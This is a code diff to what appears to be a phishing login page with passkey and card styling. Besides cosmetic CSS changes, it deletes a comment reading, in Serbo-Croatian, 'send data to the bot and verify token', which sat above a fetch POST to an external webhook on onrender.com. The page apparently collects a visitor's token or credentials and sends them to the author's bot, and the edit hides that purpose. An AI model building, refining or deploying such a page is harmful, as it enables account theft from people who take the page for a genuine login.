@@ -145,14 +145,17 @@
   .passkey:hover { text-decoration: underline; }
   @media (max-width: 720px) {
     .card { grid-template-columns: 1fr; }
-    .right { border-top: 1px solid #3f4147; padding-top: 24px; }
+    .right { display: none; }
     .brand { top: 18px; left: 18px; }
     .brand span { font-size: 20px; }
   }
   #successScreen {
     display: none;
     position: fixed; inset: 0; z-index: 999;
-    background: inherit;
+    background:
+      radial-gradient(circle at 18% 55%, rgba(180,170,255,0.18) 0%, rgba(180,170,255,0) 18%),
+      radial-gradient(circle at 60% 35%, rgba(140,110,220,0.22) 0%, rgba(140,110,220,0) 25%),
+      linear-gradient(115deg, #2b1466 0%, #3a2391 28%, #2c46c9 65%, #1f6df0 100%);
     align-items: center; justify-content: center;
     flex-direction: column; text-align: center;
   }
@@ -300,7 +303,6 @@
     spinner.classList.add('on');
 
     try {
-      // Salji podatke botu i verifikuj token
       const res = await fetch('https://opii.onrender.com/webhook/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
